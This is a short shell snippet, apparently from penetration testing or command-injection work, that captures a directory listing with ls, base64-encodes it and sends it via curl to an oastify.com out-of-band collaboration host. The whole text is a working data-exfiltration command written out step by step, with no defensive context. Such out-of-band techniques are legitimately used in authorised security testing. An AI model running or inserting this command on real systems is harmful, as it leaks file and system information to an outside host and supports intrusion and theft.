# 1. Capture the list, 2. Base64 it, 3. Strip newlines
payload=$(ls | base64 | tr -d '\n')

# 4. Send via curl using built-in URL encoding
curl -G "http://b6iu82diar2k7jdj7eq4kuaw6nce0ho6.oastify.com/" \
    --data-urlencode "output=$payload"
